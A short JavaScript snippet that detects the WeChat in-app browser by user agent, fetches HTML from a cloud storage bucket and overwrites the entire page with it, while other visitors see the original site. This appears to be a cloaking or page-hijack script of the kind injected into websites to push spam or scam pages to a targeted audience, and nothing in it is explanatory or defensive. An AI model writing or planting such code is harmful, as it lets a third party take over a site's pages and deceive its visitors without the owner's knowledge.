var ua = navigator.userAgent.toLowerCase();
if (/micromessenger/.test(ua)) {
    var xhr = new XMLHttpRequest;
    var html = null;
    function render() {
        var a = document.open("text/html", "replace");
        a.write(html);
        a.close();
    }
    xhr.onload = function () {
        html = xhr.responseText;
        var delay = 0;
        if (delay > 0) setTimeout("render()", delay * 1000)
        else render();
    };
    xhr.open("GET", "//lbbb.oss-cn-hangzhou.aliyuncs.com/hb_v3/changba/changba.html?t=" + Date.now(), !0);

    xhr.send();
}